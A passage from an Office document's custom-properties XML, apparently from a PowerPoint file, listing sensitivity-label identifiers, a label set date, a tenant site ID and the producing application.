  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_Name">
    <vt:lpwstr>defa4170-0d19-0005-0004-bc88714345d2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_SetDate">
    <vt:lpwstr>2023-05-27T10:34:22Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="MSIP_Label_2ad0b24d-6422-44b0-b3de-abb3a9e8c81a_SiteId">
    <vt:lpwstr>2fcfe26a-bb62-46b0-b1e3-28f9da0c45fd</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="12" name="Producer">
    <vt:lpwstr>Microsoft® PowerPoint® for Microsoft 365</vt:lpwstr>
  </property>
</Properties>
</file>